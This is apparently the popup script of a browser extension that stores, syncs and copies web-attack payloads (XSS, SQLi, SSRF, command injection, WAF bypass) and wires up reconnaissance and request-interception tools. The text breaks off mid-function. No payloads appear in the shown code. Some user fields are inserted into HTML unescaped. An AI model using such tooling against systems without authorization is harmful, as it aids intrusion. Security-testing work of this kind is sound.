// ===== PELURU LUHUT v2.0 - UPGRADED =====
// Features: Persistent Storage, GitHub Fetch, Subcategory, Delete, Theme, Advanced Search, Standalone Notes

const GITHUB_RAW_BASE = 'https://raw.githubusercontent.com/hyla001/luhut-binshar/main';
const STORAGE_KEYS = {
    USER_PAYLOADS: 'userPayloads',
    FAVORITES: 'favorites',
    GITHUB_PAYLOADS: 'githubPayloads',
    THEME: 'theme',
    LAST_SYNC: 'lastSync',
    USER_NOTES: 'userNotes',
    POPUP_SIZE: 'popupSize',
    HIDDEN_PAYLOADS: 'hiddenPayloads'
};

// ===== STATE =====
let githubPayloads = [];
let userPayloads = [];
let favorites = new Set();
let hiddenPayloads = new Set();
let allPayloads = [];
let activeCategory = 'All';
let activeSubcategory = null;
let selectedFormCategory = 'XSS';
let currentTheme = 'dark';
let popupSize = 'medium'; // 'small', 'medium', 'large'
let searchMode = 'normal'; // 'normal' or 'regex'
let userNotes = []; // [{id, title, content, createdAt, updatedAt}]
let currentEditingNote = null;
let fingerprints = null;
let lastTechScanResults = null; // Store last tech scan for Arsenal transfer

// ===== INIT =====
document.addEventListener('DOMContentLoaded', async function () {
    const loadingScreen = document.getElementById('loadingScreen');

    // Load theme and size first (instant)
    await loadTheme();
    await loadPopupSize();

    // Load from cache/storage
    await loadFromStorage();
    loadFingerprints();

    // Check if we have cached data
    const hasCache = githubPayloads.length > 0;

    if (hasCache) {
        // Cache exists: show data immediately, hide loading
        combinePayloads();
        renderPayloads();
        renderSubcategories();
        setupEventListeners();
        loadingScreen?.classList.add('hidden');

        // Background sync (don't block UI)
        fetchGitHubPayloads().then(() => {
            combinePayloads();
            renderPayloads();
        });
    } else {
        // No cache: show loading, fetch from GitHub
        await fetchGitHubPayloads();
        combinePayloads();
        renderPayloads();
        renderSubcategories();
        setupEventListeners();

        // Minimum loading time for UX (300ms)
        setTimeout(() => {
            loadingScreen?.classList.add('hidden');
        }, 300);
    }
});

// ===== STORAGE FUNCTIONS =====
async function loadFromStorage() {
    try {
        const result = await chrome.storage.local.get([
            STORAGE_KEYS.USER_PAYLOADS,
            STORAGE_KEYS.FAVORITES,
            STORAGE_KEYS.GITHUB_PAYLOADS,
            STORAGE_KEYS.THEME,
            STORAGE_KEYS.USER_NOTES,
            STORAGE_KEYS.HIDDEN_PAYLOADS
        ]);

        userPayloads = result[STORAGE_KEYS.USER_PAYLOADS] || [];
        favorites = new Set(result[STORAGE_KEYS.FAVORITES] || []);
        hiddenPayloads = new Set(result[STORAGE_KEYS.HIDDEN_PAYLOADS] || []);
        githubPayloads = result[STORAGE_KEYS.GITHUB_PAYLOADS] || [];
        currentTheme = result[STORAGE_KEYS.THEME] || 'dark';
        userNotes = result[STORAGE_KEYS.USER_NOTES] || [];
    } catch (e) {
        console.warn('Storage load failed:', e);
    }
}

async function saveUserPayloads() {
    try {
        await chrome.storage.local.set({ [STORAGE_KEYS.USER_PAYLOADS]: userPayloads });
    } catch (e) {
        console.warn('Save failed:', e);
    }
}

async function saveFavorites() {
    try {
        await chrome.storage.local.set({ [STORAGE_KEYS.FAVORITES]: Array.from(favorites) });
    } catch (e) {
        console.warn('Save favorites failed:', e);
    }
}

async function saveTheme() {
    try {
        await chrome.storage.local.set({ [STORAGE_KEYS.THEME]: currentTheme });
    } catch (e) {
        console.warn('Save theme failed:', e);
    }
}

async function saveUserNotes() {
    try {
        await chrome.storage.local.set({ [STORAGE_KEYS.USER_NOTES]: userNotes });
    } catch (e) {
        console.warn('Save notes failed:', e);
    }
}

async function saveHiddenPayloads() {
    try {
        await chrome.storage.local.set({ [STORAGE_KEYS.HIDDEN_PAYLOADS]: Array.from(hiddenPayloads) });
    } catch (e) {
        console.warn('Save hidden payloads failed:', e);
    }
}

// ===== GITHUB FETCH =====
async function fetchGitHubPayloads(forceRefresh = false) {
    try {
        // Check if we have cached data and it's recent (less than 1 hour old)
        const result = await chrome.storage.local.get([STORAGE_KEYS.GITHUB_PAYLOADS, STORAGE_KEYS.LAST_SYNC]);
        const lastSync = result[STORAGE_KEYS.LAST_SYNC] || 0;
        const oneHour = 60 * 60 * 1000;

        if (!forceRefresh && result[STORAGE_KEYS.GITHUB_PAYLOADS]?.length > 0 && (Date.now() - lastSync) < oneHour) {
            githubPayloads = result[STORAGE_KEYS.GITHUB_PAYLOADS];
            return;
        }

        const categories = ['xss', 'sqli', 'ssrf', 'lfi', 'rfi', 'cmdi', 'ssti', 'open_redirect', 'csrf', '2fa_bypass', 'waf_bypass'];
        const fetched = [];

        for (const cat of categories) {
            try {
                // Try GitHub first
                let response = await fetch(`${GITHUB_RAW_BASE}/payloads/${cat}.json`);

                // Fallback to local bundled file if GitHub fails
                if (!response.ok) {
                    const localUrl = chrome.runtime.getURL(`payloads/${cat}.json`);
                    response = await fetch(localUrl);
                }

                if (response.ok) {
                    const data = await response.json();
                    if (data.payloads) {
                        fetched.push(...data.payloads.map(p => ({
                            ...p,
                            source: 'github',
                            id: p.id || `gh_${cat}_${Math.random().toString(36).substr(2, 9)}`
                        })));
                    }
                }
            } catch (e) {
                // Try local as final fallback
                try {
                    const localUrl = chrome.runtime.getURL(`payloads/${cat}.json`);
                    const localResponse = await fetch(localUrl);
                    if (localResponse.ok) {
                        const data = await localResponse.json();
                        if (data.payloads) {
                            fetched.push(...data.payloads.map(p => ({
                                ...p,
                                source: 'github',
                                id: p.id || `gh_${cat}_${Math.random().toString(36).substr(2, 9)}`
                            })));
                        }
                    }
                } catch (localError) {
                    console.warn(`Failed to fetch ${cat}:`, localError);
                }
            }
        }

        if (fetched.length > 0) {
            githubPayloads = fetched;
            await chrome.storage.local.set({
                [STORAGE_KEYS.GITHUB_PAYLOADS]: fetched,
                [STORAGE_KEYS.LAST_SYNC]: Date.now()
            });
        }
    } catch (e) {
        console.warn('GitHub fetch failed:', e);
    }
}

function combinePayloads() {
    // Mark user payloads with source
    const marked = userPayloads.map(p => ({ ...p, source: 'user' }));

    // Combine and filter out hidden payloads
    const combined = [...marked, ...githubPayloads];
    allPayloads = combined.filter(p => !hiddenPayloads.has(p.id));

    // Apply favorites
    allPayloads.forEach(p => {
        p.favorite = favorites.has(p.id);
    });
}

// ===== THEME =====
async function loadTheme() {
    try {
        const result = await chrome.storage.local.get(STORAGE_KEYS.THEME);
        currentTheme = result[STORAGE_KEYS.THEME] || 'dark';
        applyTheme();
    } catch (e) {
        currentTheme = 'dark';
        applyTheme();
    }
}

function applyTheme() {
    document.body.classList.remove('theme-dark', 'theme-light');
    document.body.classList.add(`theme-${currentTheme}`);

    const themeBtn = document.getElementById('themeBtn');
    if (themeBtn) {
        themeBtn.innerHTML = currentTheme === 'dark'
            ? '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="5"/><path d="M12 1v2M12 21v2M4.22 4.22l1.42 1.42M18.36 18.36l1.42 1.42M1 12h2M21 12h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42"/></svg>'
            : '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>';
    }
}

function toggleTheme() {
    currentTheme = currentTheme === 'dark' ? 'light' : 'dark';
    applyTheme();
    saveTheme();
    showToast(`Theme: ${currentTheme === 'dark' ? 'Dark Mode' : 'Light Mode'}`);
}

// ===== POPUP SIZE =====
async function loadPopupSize() {
    try {
        const result = await chrome.storage.local.get(STORAGE_KEYS.POPUP_SIZE);
        popupSize = result[STORAGE_KEYS.POPUP_SIZE] || 'medium';
        applyPopupSize();
    } catch (e) {
        popupSize = 'medium';
        applyPopupSize();
    }
}

function applyPopupSize() {
    const html = document.documentElement;
    const body = document.body;

    // Remove existing size classes
    html.classList.remove('popup-small', 'popup-medium', 'popup-large');
    body.classList.remove('popup-small', 'popup-medium', 'popup-large');

    // Apply new size class
    html.classList.add(`popup-${popupSize}`);
    body.classList.add(`popup-${popupSize}`);

    // Update size buttons UI
    document.querySelectorAll('.size-btn').forEach(btn => {
        btn.classList.toggle('active', btn.dataset.size === popupSize);
    });
}

function setPopupSize(size) {
    popupSize = size;
    applyPopupSize();
    savePopupSize();
    showToast(`Ukuran: ${size === 'small' ? 'Kecil' : size === 'medium' ? 'Sedang' : 'Besar'}`);
}

async function savePopupSize() {
    try {
        await chrome.storage.local.set({ [STORAGE_KEYS.POPUP_SIZE]: popupSize });
    } catch (e) {
        console.warn('Save popup size failed:', e);
    }
}

// ===== EVENT LISTENERS =====
function setupEventListeners() {
    // Search input with debounce
    let searchTimeout;
    document.getElementById('searchInput').addEventListener('input', function () {
        clearTimeout(searchTimeout);
        searchTimeout = setTimeout(() => filterPayloads(), 150);
    });

    // Search mode toggle (normal/regex)
    document.getElementById('searchModeBtn')?.addEventListener('click', toggleSearchMode);

    // Category tabs
    document.querySelectorAll('.category-tab').forEach(tab => {
        tab.addEventListener('click', function () {
            setCategory(this.dataset.category, this);
        });
    });

    // Category options in form
    document.querySelectorAll('.category-option').forEach(opt => {
        opt.addEventListener('click', function () {
            selectCategory(this.dataset.category, this);
        });
    });

    // Navigation buttons
    document.getElementById('settingsBtn').addEventListener('click', () => showScreen('settings'));
    document.getElementById('addBtn').addEventListener('click', () => showScreen('add'));

    // Tech Detector button
    document.getElementById('techBtn')?.addEventListener('click', () => showScreen('tech'));

    // Files/Vault button - stay in popup
    document.getElementById('filesBtn')?.addEventListener('click', () => showScreen('files'));

    // Upload button in files screen
    document.getElementById('uploadFileBtn')?.addEventListener('click', () => {
        document.getElementById('fileInput')?.click();
    });

    document.getElementById('backFromAdd')?.addEventListener('click', () => showScreen('main'));
    document.getElementById('backFromSettings')?.addEventListener('click', () => showScreen('main'));
    document.getElementById('cancelAdd')?.addEventListener('click', () => showScreen('main'));
    document.getElementById('savePayloadBtn')?.addEventListener('click', savePayload);
    document.getElementById('backFromTech')?.addEventListener('click', () => showScreen('main'));
    document.getElementById('refreshTechBtn')?.addEventListener('click', scanCurrentTab);

    // Payload Mutator events
    setupMutatorEvents();

    // Endpoint Discoverer & Subdomain Finder events
    setupEndpointEvents();
    setupSubdomainEvents();

    // Request Interceptor events
    setupParameterEvents();

    // Tools Screen navigation (from header eye icon)
    document.getElementById('toolsBtn')?.addEventListener('click', () => showScreen('tools'));
    document.getElementById('backFromTools')?.addEventListener('click', () => showScreen('main'));

    // From Tools Screen to individual tools
    document.getElementById('openMutator')?.addEventListener('click', () => showScreen('mutator'));
    document.getElementById('openEndpoint')?.addEventListener('click', () => showScreen('endpoint'));
    document.getElementById('openSubdomain')?.addEventListener('click', () => showScreen('subdomain'));
    document.getElementById('openParameter')?.addEventListener('click', () => showScreen('parameter'));
    document.getElementById('openSecurityAnalyzer')?.addEventListener('click', () => {
        showScreen('security');
        setupSecurityEvents();
    });

    // Settings buttons
    document.getElementById('syncBtn').addEventListener('click', syncPayloads);
    document.getElementById('exportBtn').addEventListener('click', exportData);
    document.getElementById('importBtn').addEventListener('click', () => {
        document.getElementById('importFileInput').click();
    });
    document.getElementById('importFileInput').addEventListener('change', handleImportFile);
    document.getElementById('wipeBtn').addEventListener('click', wipeUserData);
    document.getElementById('themeBtn')?.addEventListener('click', toggleTheme);

    // Popup size buttons
    document.querySelectorAll('.size-btn').forEach(btn => {
        btn.addEventListener('click', function () {
            setPopupSize(this.dataset.size);
        });
    });

    // Subcategory clicks
    document.getElementById('subcategoryList')?.addEventListener('click', handleSubcategoryClick);

    // Custom category input
    document.getElementById('addCustomCategoryBtn')?.addEventListener('click', addCustomCategory);
    document.getElementById('customCategory')?.addEventListener('keypress', function (e) {
        if (e.key === 'Enter') addCustomCategory();
    });

    // Notes screen
    document.getElementById('notesBtn')?.addEventListener('click', showNotesScreen);
    document.getElementById('backFromNotes')?.addEventListener('click', () => showScreen('main'));
    document.getElementById('addNoteBtn')?.addEventListener('click', () => openNoteEditor(null));

    // Note detail screen
    document.getElementById('backFromNoteDetail')?.addEventListener('click', backToNotesList);
    document.getElementById('editNoteFromDetail')?.addEventListener('click', () => {
        if (currentEditingNote) openNoteEditor(currentEditingNote.id);
    });
    document.getElementById('deleteNoteFromDetail')?.addEventListener('click', () => {
        if (currentEditingNote) {
            deleteNote(currentEditingNote.id);
            backToNotesList();
        }
    });

    // Note editor modal
    document.getElementById('closeNoteEditor')?.addEventListener('click', closeNoteEditor);
    document.getElementById('saveNoteBtn')?.addEventListener('click', saveNote);

    // Close modal on overlay click
    document.getElementById('noteModal')?.addEventListener('click', function (e) {
        if (e.target === this) closeNoteEditor();
    });

    // Custom confirm modal
    document.getElementById('confirmOk')?.addEventListener('click', handleConfirmOk);
    document.getElementById('confirmCancel')?.addEventListener('click', handleConfirmCancel);

    // Initial load of persistent data
    loadPersistentData();
}

async function loadPersistentData() {
    try {
        const response = await chrome.runtime.sendMessage({ type: 'loadDiscoveredData' });
        if (response) {
            if (response.endpoints) {
                discoveredEndpoints = response.endpoints;
                if (discoveredEndpoints.apis.length > 0 || discoveredEndpoints.paths.length > 0) {
                    renderEndpointResults();
                    const statsDiv = document.getElementById('endpointStats');
                    if (statsDiv) {
                        statsDiv.classList.remove('hidden');
                        document.getElementById('statApiCount').textContent = discoveredEndpoints.apis.length;
                        document.getElementById('statPathCount').textContent = discoveredEndpoints.paths.length;
                        document.getElementById('statJsCount').textContent = discoveredEndpoints.jsFiles.length;
                    }
                }
            }
            if (response.subdomains) {
                discoveredSubdomains = response.subdomains;
                if (discoveredSubdomains.length > 0) {
                    renderSubdomainResults();
                }
            }
        }

        const statusResponse = await chrome.runtime.sendMessage({ type: 'getInterceptedRequests' });
        if (statusResponse && statusResponse.requests) {
            interceptedRequests = statusResponse.requests;
            renderRequestList();
        }
    } catch (e) {
        console.warn('Failed to load persistent data:', e);
    }
}

// ===== SCREENS =====
function showScreen(name) {
    document.querySelectorAll('.screen').forEach(s => s.classList.add('hidden'));
    document.getElementById(name + 'Screen').classList.remove('hidden');

    if (name === 'tech') scanCurrentTab();
    if (name === 'files') renderFilesGrid();
    if (name === 'interceptor') syncInterceptorState();
}

// ===== CATEGORIES & SUBCATEGORIES =====
function setCategory(cat, btn) {
    activeCategory = cat;
    activeSubcategory = null;
    document.querySelectorAll('.category-tab').forEach(t => t.classList.remove('active'));
    btn.classList.add('active');
    renderSubcategories();
    filterPayloads();
}

function selectCategory(cat, btn) {
    selectedFormCategory = cat;
    document.querySelectorAll('.category-option').forEach(o => o.classList.remove('active'));
    btn.classList.add('active');
    // Clear custom input when selecting predefined category
    const customInput = document.getElementById('customCategory');
    if (customInput) customInput.value = '';
}

function addCustomCategory() {
    const input = document.getElementById('customCategory');
    const value = input?.value.trim().toUpperCase();

    if (!value) {
        showToast('Masukkan nama kaliber');
        return;
    }

    if (value.length > 15) {
        showToast('Maksimal 15 karakter');
        return;
    }

    // Check if category already exists
    const existingBtn = document.querySelector(`.category-option[data-category="${value}"]`);
    if (existingBtn) {
        selectCategory(value, existingBtn);
        input.value = '';
        showToast('Kaliber sudah ada, dipilih');
        return;
    }

    // Create new category button with delete capability
    const grid = document.querySelector('.category-grid');
    const wrapper = document.createElement('div');
    wrapper.className = 'custom-category-wrapper';
    wrapper.dataset.category = value;

    const newBtn = document.createElement('button');
    newBtn.type = 'button';
    newBtn.className = 'category-option custom active';
    newBtn.dataset.category = value;
    newBtn.innerHTML = `<span>${value}</span><span class="delete-category" data-cat="${value}">×</span>`;

    newBtn.addEventListener('click', function (e) {
        // If clicking delete button
        if (e.target.classList.contains('delete-category')) {
            e.stopPropagation();
            deleteCustomCategory(e.target.dataset.cat);
            return;
        }
        selectCategory(this.dataset.category, this);
    });

    // Deselect others and add new
    document.querySelectorAll('.category-option').forEach(o => o.classList.remove('active'));
    grid.appendChild(newBtn);
    selectedFormCategory = value;
    input.value = '';
    showToast(`Kaliber "${value}" ditambahkan`);
}

function deleteCustomCategory(cat) {
    const btn = document.querySelector(`.category-option[data-category="${cat}"]`);
    if (btn && btn.classList.contains('custom')) {
        btn.remove();
        // Select first category if the deleted one was selected
        if (selectedFormCategory === cat) {
            const firstBtn = document.querySelector('.category-option');
            if (firstBtn) {
                selectCategory(firstBtn.dataset.category, firstBtn);
            }
        }
        showToast(`Kaliber "${cat}" dihapus`);
    }
}

function getSubcategories(category) {
    if (category === 'All') return [];
    const subs = new Set();
    allPayloads.filter(p => p.category === category).forEach(p => {
        if (p.subcategory) subs.add(p.subcategory);
    });
    return Array.from(subs).sort();
}

function renderSubcategories() {
    const container = document.getElementById('subcategoryList');
    if (!container) return;

    // Disabled - hide subcategory tabs
    container.style.display = 'none';
    return;
}

function handleSubcategoryClick(e) {
    const btn = e.target.closest('.subcategory-btn');
    if (!btn) return;

    activeSubcategory = btn.dataset.sub || null;
    document.querySelectorAll('.subcategory-btn').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    filterPayloads();
}

// ===== SEARCH =====
function toggleSearchMode() {
    searchMode = searchMode === 'normal' ? 'regex' : 'normal';
    const btn = document.getElementById('searchModeBtn');
    if (btn) {
        btn.classList.toggle('active', searchMode === 'regex');
        btn.title = searchMode === 'regex' ? 'Regex Mode ON' : 'Normal Search';
    }
    showToast(`Search: ${searchMode === 'regex' ? 'Regex Mode' : 'Normal'}`);
    filterPayloads();
}

function matchesSearch(payload, query) {
    if (!query) return true;

    if (searchMode === 'regex') {
        try {
            const regex = new RegExp(query, 'i');
            return regex.test(payload.title) ||
                regex.test(payload.payload || payload.code) ||
                (payload.tags || []).some(t => regex.test(t)) ||
                regex.test(payload.subcategory || '');
        } catch (e) {
            return false; // Invalid regex
        }
    } else {
        const q = query.toLowerCase();
        return payload.title.toLowerCase().includes(q) ||
            (payload.payload || payload.code || '').toLowerCase().includes(q) ||
            (payload.tags || []).some(t => t.toLowerCase().includes(q)) ||
            (payload.subcategory || '').toLowerCase().includes(q);
    }
}

// ===== FILTER & RENDER =====
function filterPayloads() {
    const query = document.getElementById('searchInput').value;

    const filtered = allPayloads.filter(p => {
        const matchCat = activeCategory === 'All' || p.category === activeCategory;
        const matchSub = !activeSubcategory || p.subcategory === activeSubcategory;
        const matchQuery = matchesSearch(p, query);
        return matchCat && matchSub && matchQuery;
    });

    // Sort: favorites first, then by title
    filtered.sort((a, b) => {
        if (a.favorite && !b.favorite) return -1;
        if (!a.favorite && b.favorite) return 1;
        return a.title.localeCompare(b.title);
    });

    renderPayloads(filtered);
}

function renderPayloads(list) {
    if (!list) list = allPayloads;
    const container = document.getElementById('payloadsList');
    const empty = document.getElementById('emptyState');

    if (list.length === 0) {
        container.innerHTML = '';
        empty.style.display = 'flex';
        return;
    }

    empty.style.display = 'none';
    container.innerHTML = list.map(p => {
        const code = p.payload || p.code || '';
        const isUserPayload = p.source === 'user';

        return `
    <div class="payload-card ${p.favorite ? 'is-favorite' : ''}" data-id="${p.id}">
      <div class="payload-header">
        <div class="payload-info">
          <h3>${escapeHtml(p.title)}</h3>
          <div class="payload-badges">
            <span class="payload-category-badge">${p.category}</span>
            ${p.subcategory ? `<span class="payload-subcategory-badge">${p.subcategory}</span>` : ''}
            ${isUserPayload ? '<span class="payload-user-badge">USER</span>' : ''}
          </div>
        </div>
        <div class="payload-header-actions">
          <button class="favorite-btn ${p.favorite ? 'active' : ''}" data-action="favorite" data-id="${p.id}" title="Favorite">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="${p.favorite ? 'currentColor' : 'none'}" stroke="currentColor" stroke-width="1.5">
              <polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/>
            </svg>
          </button>
          <button class="delete-btn" data-action="delete" data-id="${p.id}" title="Hide">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 01-2 2H7a2 2 0 01-2-2V6m3 0V4a2 2 0 012-2h4a2 2 0 012 2v2"/>
            </svg>
          </button>
        </div>
      </div>
      <div class="payload-code">${escapeHtml(code)}</div>
      <div class="payload-footer">
        <div class="payload-tags">${(p.tags || []).slice(0, 3).map(t => `<span class="payload-tag">#${t}</span>`).join('')}</div>
        <div class="payload-actions">
          <button class="copy-btn" data-action="copy" data-code="${escapeHtml(code)}" title="Copy">
            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/>
            </svg>
            Copy
          </button>
        </div>
      </div>
    </div>
  `}).join('');

    // Add event listeners
    container.querySelectorAll('[data-action]').forEach(btn => {
        btn.addEventListener('click', handlePayloadAction);
    });
}

function handlePayloadAction(e) {
    e.stopPropagation();
    const btn = e.currentTarget;
    const action = btn.dataset.action;
    const id = btn.dataset.id;

    if (action === 'copy') {
        const code = btn.dataset.code;
        navigator.clipboard.writeText(code).then(() => showToast('Amunisi disalin'));
    } else if (action === 'favorite') {
        toggleFavorite(id);
    } else if (action === 'delete') {
        deletePayload(id);
    }
}

// ===== PAYLOAD ACTIONS =====
function toggleFavorite(id) {
    if (favorites.has(id)) {
        favorites.delete(id);
    } else {
        favorites.add(id);
    }
    saveFavorites();
    combinePayloads();
    filterPayloads();
    showToast(favorites.has(id) ? 'Ditambahkan ke favorit' : 'Dihapus dari favorit');
}

async function deletePayload(id) {
    // Find payload in either user or github payloads
    const userPayload = userPayloads.find(p => p.id === id);
    const allPayload = allPayloads.find(p => p.id === id);

    if (!allPayload) {
        showToast('Payload tidak ditemukan');
        return;
    }

    const confirmed = await customConfirm(`Sembunyikan "${allPayload.title}"?`);
    if (confirmed) {
        if (userPayload) {
            // User payload: delete permanently
            userPayloads = userPayloads.filter(p => p.id !== id);
            saveUserPayloads();
        }

        // Add to hidden list (works for both user and github payloads)
        hiddenPayloads.add(id);
        favorites.delete(id);

        saveHiddenPayloads();
        saveFavorites();
        combinePayloads();
        filterPayloads();
        showToast('Payload disembunyikan');
    }
}

function savePayload() {
    const title = document.getElementById('payloadTitle').value.trim();
    const code = document.getElementById('payloadContent').value.trim();

    if (!title || !code) {
        showToast('Lengkapi data amunisi');
        return;
    }

    const newPayload = {
        id: `user_${Date.now()}`,
        title,
        category: selectedFormCategory,
        subcategory: 'Custom',
        payload: code,
        tags: ['custom', 'user'],
        source: 'user'
    };

    userPayloads.unshift(newPayload);
    saveUserPayloads();
    combinePayloads();

    document.getElementById('payloadTitle').value = '';
    document.getElementById('payloadContent').value = '';

    showScreen('main');
    filterPayloads();
    showToast('Amunisi diproduksi');
}

// ===== SETTINGS ACTIONS =====
async function syncPayloads() {
    showToast('Syncing...');
    await fetchGitHubPayloads(true);
    combinePayloads();
    filterPayloads();
    showToast(`Synced! ${githubPayloads.length} payloads dari GitHub`);
}

function exportData() {
    const data = JSON.stringify({
        exportedAt: new Date().toISOString(),
        userPayloads,
        favorites: Array.from(favorites)
    }, null, 2);

    const blob = new Blob([data], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'peluru-luhut-export.json';
    a.click();
    URL.revokeObjectURL(url);
    showToast('Export berhasil');
}

async function handleImportFile(event) {
    const file = event.target.files[0];
    if (!file) return;

    try {
        const text = await file.text();
        const data = JSON.parse(text);

        // Validate data structure
        if (!data.userPayloads && !data.favorites) {
            showToast('Format file tidak valid');
            return;
        }

        // Merge user payloads (avoid duplicates by ID)
        if (data.userPayloads && Array.isArray(data.userPayloads)) {
            const existingIds = new Set(userPayloads.map(p => p.id));
            const newPayloads = data.userPayloads.filter(p => !existingIds.has(p.id));
            userPayloads = [...userPayloads, ...newPayloads];
            await saveUserPayloads();
        }

        // Merge favorites
        if (data.favorites && Array.isArray(data.favorites)) {
            data.favorites.forEach(id => favorites.add(id));
            await saveFavorites();
        }

        // Refresh UI
        combinePayloads();
        filterPayloads();

        const imported = (data.userPayloads?.length || 0);
        showToast(`Import berhasil: ${imported} payload`);

    } catch (e) {
        console.error('Import failed:', e);
        showToast('Gagal import: file tidak valid');
    }

    // Reset file input
    event.target.value = '';
}

async function wipeUserData() {
    if (confirm('Hapus semua data user (payloads & favorites)?\nPayload dari GitHub tidak akan dihapus.')) {
        userPayloads = [];
        favorites.clear();
        await saveUserPayloads();
        await saveFavorites();
        combinePayloads();
        filterPayloads();
        showToast('Data user dihapus');
    }
}

// ===== UTILITIES =====
function showToast(message) {
    const toast = document.getElementById('toast');
    document.getElementById('toastMessage').textContent = message;
    toast.classList.add('show');
    setTimeout(() => toast.classList.remove('show'), 2000);
}

function escapeHtml(text) {
    if (!text) return '';
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// Custom confirm dialog (replaces native confirm())
let confirmResolve = null;

function customConfirm(message) {
    return new Promise((resolve) => {
        confirmResolve = resolve;
        document.getElementById('confirmMessage').textContent = message;
        document.getElementById('confirmModal').classList.add('show');
    });
}

function handleConfirmOk() {
    document.getElementById('confirmModal').classList.remove('show');
    if (confirmResolve) confirmResolve(true);
    confirmResolve = null;
}

function handleConfirmCancel() {
    document.getElementById('confirmModal').classList.remove('show');
    if (confirmResolve) confirmResolve(false);
    confirmResolve = null;
}

// ===== STANDALONE NOTES FUNCTIONS =====
function showNotesScreen() {
    showScreen('notes');
    renderNotesList();
}

function renderNotesList() {
    const container = document.getElementById('notesList');
    const empty = document.getElementById('notesEmptyState');

    if (userNotes.length === 0) {
        container.innerHTML = '';
        empty.style.display = 'flex';
        return;
    }

    empty.style.display = 'none';
    container.innerHTML = userNotes.map(note => `
        <div class="note-card" data-id="${note.id}" data-action="viewNote">
            <div class="note-card-header">
                <h4>${escapeHtml(note.title || 'Catatan')}</h4>
                <span class="note-date">${formatDate(note.updatedAt || note.createdAt)}</span>
            </div>
            <p class="note-content-preview">${escapeHtml((note.content || '').substring(0, 100))}${note.content && note.content.length > 100 ? '...' : ''}</p>
        </div>
    `).join('');

    // Add event listeners for card click
    container.querySelectorAll('.note-card').forEach(card => {
        card.addEventListener('click', function (e) {
            // Don't trigger if clicking action buttons
            if (e.target.closest('[data-action="editNote"]') || e.target.closest('[data-action="deleteNote"]')) return;
            showNoteDetail(this.dataset.id);
        });
    });
}

function showNoteDetail(noteId) {
    const note = userNotes.find(n => n.id === noteId);
    if (!note) return;

    currentEditingNote = note;

    document.getElementById('noteDetailTitle').textContent = note.title || 'Catatan';
    document.getElementById('noteDetailDate').textContent = formatDate(note.updatedAt || note.createdAt);
    document.getElementById('noteDetailContent').textContent = note.content || '';

    showScreen('noteDetail');
}

function backToNotesList() {
    currentEditingNote = null;
    showScreen('notes');
    renderNotesList();
}

function handleNoteAction(e) {
    const action = e.currentTarget.dataset.action;
    const id = e.currentTarget.dataset.id;

    if (action === 'editNote') {
        openNoteEditor(id);
    } else if (action === 'deleteNote') {
        deleteNote(id);
    }
}

function openNoteEditor(noteId = null) {
    currentEditingNote = noteId ? userNotes.find(n => n.id === noteId) : null;

    document.getElementById('noteEditorTitle').textContent = currentEditingNote ? 'Edit Catatan' : 'Catatan Baru';
    document.getElementById('noteTitleInput').value = currentEditingNote?.title || '';
    document.getElementById('noteContentInput').value = currentEditingNote?.content || '';

    document.getElementById('noteModal').classList.add('show');
    document.getElementById('noteTitleInput').focus();
}

function closeNoteEditor() {
    document.getElementById('noteModal').classList.remove('show');
    // Only reset currentEditingNote if NOT on detail screen
    const detailScreen = document.getElementById('noteDetailScreen');
    if (detailScreen.classList.contains('hidden')) {
        currentEditingNote = null;
    }
}

function saveNote() {
    const title = document.getElementById('noteTitleInput').value.trim();
    const content = document.getElementById('noteContentInput').value.trim();

    if (!title && !content) {
        showToast('Isi catatan');
        return;
    }

    let savedNoteId = null;

    if (currentEditingNote) {
        // Update existing note
        const idx = userNotes.findIndex(n => n.id === currentEditingNote.id);
        if (idx !== -1) {
            userNotes[idx].title = title || 'Catatan';
            userNotes[idx].content = content;
            userNotes[idx].updatedAt = Date.now();
            savedNoteId = currentEditingNote.id;
        }
        showToast('Catatan diupdate');
    } else {
        // Create new note
        const newNote = {
            id: `note_${Date.now()}`,
            title: title || 'Catatan',
            content: content,
            createdAt: Date.now(),
            updatedAt: Date.now()
        };
        userNotes.unshift(newNote);
        savedNoteId = newNote.id;
        showToast('Catatan disimpan');
    }

    saveUserNotes();
    document.getElementById('noteModal').classList.remove('show');

    // Check if we're on detail screen - refresh it
    const detailScreen = document.getElementById('noteDetailScreen');
    if (!detailScreen.classList.contains('hidden') && savedNoteId) {
        showNoteDetail(savedNoteId);
    } else {
        currentEditingNote = null;
        renderNotesList();
    }
}

async function deleteNote(noteId) {
    const note = userNotes.find(n => n.id === noteId);
    if (!note) return;

    const confirmed = await customConfirm(`Hapus "${note.title}"?`);
    if (confirmed) {
        userNotes = userNotes.filter(n => n.id !== noteId);
        saveUserNotes();
        renderNotesList();
        showToast('Catatan dihapus');
    }
}

function formatDate(timestamp) {
    if (!timestamp) return '';
    const date = new Date(timestamp);
    return date.toLocaleDateString('id-ID', { day: 'numeric', month: 'short', year: 'numeric' });
}

// ===== TECH DETECTOR LOGIC =====
async function loadFingerprints() {
    try {
        // Try to use cached fingerprints from background sync first
        const cached = await chrome.storage.local.get('cachedFingerprints');
        if (cached.cachedFingerprints) {
            fingerprints = cached.cachedFingerprints;
            console.log('[Tech Detector] Using cached fingerprints from GitHub sync');
            return;
        }

        // Fallback to local extension file
        const response = await fetch(chrome.runtime.getURL('utils/fingerprints.json'));
        fingerprints = await response.json();
        console.log('[Tech Detector] Using local fingerprints file');
    } catch (e) {
        console.error('Failed to load fingerprints:', e);
    }
}

async function scanCurrentTab() {
